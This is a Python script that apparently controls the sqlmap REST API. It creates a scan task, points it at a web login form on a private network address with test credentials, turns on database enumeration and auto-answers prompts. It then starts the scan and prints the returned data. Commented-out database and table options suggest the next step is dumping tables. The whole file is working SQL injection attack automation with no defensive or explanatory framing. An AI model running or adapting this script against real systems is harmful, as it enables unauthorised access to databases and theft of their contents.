import requests
import json
import time

response = requests.get(
    url='http://127.0.0.1:7000/task/new')

if response.status_code == 200:
    time.sleep(1)
    id = response.json().get('taskid')
    response2 = requests.post(
    url=f'http://127.0.0.1:7000/option/{id}/set',
    data=json.dumps({'url': 'http://192.168.100.164/login', 
                     'data': 'username=test&password=test',
                     'getDbs':True,
                     'getTables':False,
                     'dumpTable':False,
                    #  'db':db,
                    #  'tbl':tbl,
                     'answers': "Y"}),
    headers={'Content-Type':'application/json'})
    if response2.status_code == 200:
        time.sleep(1)
        response3 = requests.post(
                url=f'http://127.0.0.1:7000/scan/{id}/start',
                data=json.dumps({}),
                headers={'Content-Type':'application/json'})
        if response3.status_code == 200:
            time.sleep(1)
            response4 = requests.get(url=f'http://127.0.0.1:7000/scan/{id}/data').json()
            print(response4)